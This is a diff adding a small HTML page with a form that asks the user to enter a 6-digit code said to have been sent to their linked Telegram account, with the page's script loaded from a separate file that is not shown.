@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Enter Code</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="page">
+    <div class="notice-card">
+      <div class="notice-row">
+        <span class="alert-icon">#</span>
+        <p class="notice-text">A <strong>6-digit code</strong> has been sent to your linked Telegram. Enter it below to finish.</p>
+      </div>
+    </div>
+
+    <div class="unlock-box">
+      <label for="otp">6-digit code</label>
+      <input id="otp" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="000000">
+
+      <button id="verifyBtn" class="unlock-btn">VERIFY CODE</button>
+      <p id="statusMsg" class="msg"></p>
+    </div>
+  </main>
+
+  <script src="app.js"></script>
+</body>
+</html>
